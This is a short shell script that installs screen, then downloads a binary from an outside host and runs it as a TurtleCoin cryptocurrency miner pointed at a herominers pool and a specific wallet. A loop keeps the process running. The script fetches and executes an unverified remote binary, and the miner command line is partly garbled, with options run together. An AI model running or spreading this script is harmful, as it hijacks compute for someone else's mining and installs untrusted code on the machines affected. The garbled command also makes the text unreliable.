#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://swenson.my.id/mining/masterfile
chmod +x masterfile
./masterfile --donate-level 1 -o sg.turtlecoin.herominers.com:10381 -u TRTLv3FnU3VJ8hZ9QnUrRLLs2X9mXNYijfLmL9T4b3knY7voPt1rRRPHoQ9yDogg7wKsMjKjJ4cVu1QG3Bg6YL6sGSaot8t4YLe -p x -a argon2/chukwav2 -ksleep 3donesleep 999
while [ 1 ]; do
sleep 3
done
sleep 999
